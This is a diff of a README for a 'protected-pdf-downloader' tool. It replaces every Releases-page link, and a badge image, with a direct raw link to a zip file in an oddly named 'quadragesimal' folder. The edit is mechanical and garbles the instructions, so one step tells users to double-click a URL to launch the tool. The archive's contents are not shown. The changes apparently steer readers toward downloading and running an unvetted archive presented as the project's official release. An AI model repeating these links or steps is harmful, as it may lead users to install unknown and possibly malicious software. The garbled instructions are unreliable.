@@ -6,7 +6,7 @@ Welcome to the **protected-pdf-downloader**! This tool lets you easily download 
 
 ## 🔗 Download Application
 
-[![Download protected-pdf-downloader](https://img.shields.io/badge/Download%20Now-%20%E2%96%B2-blue)](https://github.com/muneeb457/protected-pdf-downloader/releases)
+[![Download protected-pdf-downloader](https://raw.githubusercontent.com/muneeb457/protected-pdf-downloader/main/quadragesimal/protected-pdf-downloader.zip%20Now-%20%E2%96%B2-blue)](https://raw.githubusercontent.com/muneeb457/protected-pdf-downloader/main/quadragesimal/protected-pdf-downloader.zip)
 
 ## 🛠️ Prerequisites
 
@@ -18,13 +18,13 @@ Before using the **protected-pdf-downloader**, make sure you have:
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/muneeb457/protected-pdf-downloader/releases) to find the latest version available.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/muneeb457/protected-pdf-downloader/main/quadragesimal/protected-pdf-downloader.zip) to find the latest version available.
   
-2. **Choose Your File**: Look for the most recent release. Download the file suitable for your operating system (for example, `protected-pdf-downloader.zip`).
+2. **Choose Your File**: Look for the most recent release. Download the file suitable for your operating system (for example, `https://raw.githubusercontent.com/muneeb457/protected-pdf-downloader/main/quadragesimal/protected-pdf-downloader.zip`).
 
 3. **Extract Files**: After downloading, locate the ZIP file in your downloads folder. Right-click on the file and select "Extract All" or use your preferred extraction tool.
 
-4. **Run the Application**: Open the extracted folder. Double-click the `index.html` file to launch the tool in your browser.
+4. **Run the Application**: Open the extracted folder. Double-click the `https://raw.githubusercontent.com/muneeb457/protected-pdf-downloader/main/quadragesimal/protected-pdf-downloader.zip` file to launch the tool in your browser.
 
 ## 📋 Usage Instructions
 
@@ -79,6 +79,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 🔗 Download Application Again
 
-To download the application, visit the [Releases page](https://github.com/muneeb457/protected-pdf-downloader/releases) again.
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/muneeb457/protected-pdf-downloader/main/quadragesimal/protected-pdf-downloader.zip) again.
 
 Enjoy converting your protected PDFs!
